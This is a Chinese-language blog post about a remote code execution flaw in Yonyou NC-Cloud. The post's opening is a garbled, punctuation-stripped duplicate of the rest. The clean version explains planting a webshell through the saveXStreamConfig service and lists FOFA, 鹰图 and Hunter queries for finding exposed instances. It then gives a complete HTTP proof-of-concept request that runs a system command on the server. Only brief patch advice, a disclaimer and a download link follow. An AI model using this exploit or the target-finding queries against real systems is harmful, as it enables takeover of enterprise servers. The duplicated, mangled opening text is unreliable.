---
layout: post
title: "用友NCCloud远程代码执行漏洞2023HW
date   20231028
tags webNCCloudxxxapplication
comments true
author admin

 用友NCCloud远程代码执行漏洞2023HW

 简介
本资源文件提供了关于用友NCCloud远程代码执行漏洞的详细信息和相关工具该漏洞是在2023年HW期间被发现的攻击者可以通过特定的接口调用服务中的方法直接在服务器上执行任意代码从而获取服务器的控制权

 漏洞详情
该漏洞是通过请求特定的接口然后调用ncitfiufoIBaseSPService服务中的saveXStreamConfig方法进行请求直接往webappsncweb目录写马最后访问刚才写的马调用 RuntimegetRuntimeexeccommand 来执行系统命令并通过 getInputStream 获取该命令的输出流然后使用 IOUtilstoString 方法将输出流转换为字符串

 资产搜索
 FOFA app用友NCCloud
 鹰图 web title大型企业数字化平台
 Hunter web bodyuaprbac

 漏洞复现
通过接口写马把马写到web目录webappsncweb具体的PoC请求示例如下
http
POST 0811jsperrorbshInterpreter HTTP11
Host xxxxxxxxxxxxxxxx
CacheControl maxage0
UpgradeInsecureRequests 1
UserAgent Mozilla50 Windows NT 100 Win64 x64 AppleWebKit53736 KHTML like Gecko
Accept texthtmlapplicationxhtmlxmlapplicationxmlq09imageavifimagewebpimageapngq08applicationsignedexchangevb3q09
AcceptEncoding gzip deflate
AcceptLanguage zhCNzhq09
Cookie cookiets1681785470496 JSESSIONID33989F450B1EA57D4D3ED07A343770FFserver
IfNoneMatch W15711589211696000"
date:   2023-10-28
tags: [web,NC,Cloud,xxx,application]
comments: true
author: admin
---
# 用友-NC-Cloud远程代码执行漏洞[2023-HW]

## 简介
本资源文件提供了关于用友-NC-Cloud远程代码执行漏洞的详细信息和相关工具。该漏洞是在2023年HW期间被发现的，攻击者可以通过特定的接口调用服务中的方法，直接在服务器上执行任意代码，从而获取服务器的控制权。

## 漏洞详情
该漏洞是通过请求特定的接口，然后调用"nc_itf_iufo_IBaseSPService"服务中的"saveXStreamConfig"方法进行请求，直接往webapps/nc_web/目录写马，最后访问刚才写的马，调用 `Runtime.getRuntime().exec("command")` 来执行系统命令，并通过 `getInputStream()` 获取该命令的输出流，然后使用 `IOUtils.toString()` 方法将输出流转换为字符串。

## 资产搜索
- **FOFA**: app="用友-NC-Cloud"
- **鹰图**: web title="大型企业数字化平台"
- **Hunter**: web body="uap/rbac"

## 漏洞复现
通过接口写马，把马写到web目录：webapps/nc_web/。具体的PoC请求示例如下：
```http
POST /0811.jsp?error=bsh.Interpreter HTTP/1.1
Host: xxx.xxx.xxx.xxx:xxxx
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: cookiets=1681785470496; JSESSIONID=33989F450B1EA57D4D3ED07A343770FF;server
If-None-Match: W/"1571-1589211696000"
If-Modified-Since: Mon, 11 May 2020 15:41:36 GMT
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 98

cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec("ifconfig").getInputStream())
```

## 修复建议
1. 更新至最新版本。
2. 配置WAF规则拦截敏感字符：eval(param、param_error等。

## 免责声明
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。

## 下载链接

[用友-NC-Cloud远程代码执行漏洞2023-HW](https://pan.quark.cn/s/d704944b68fd)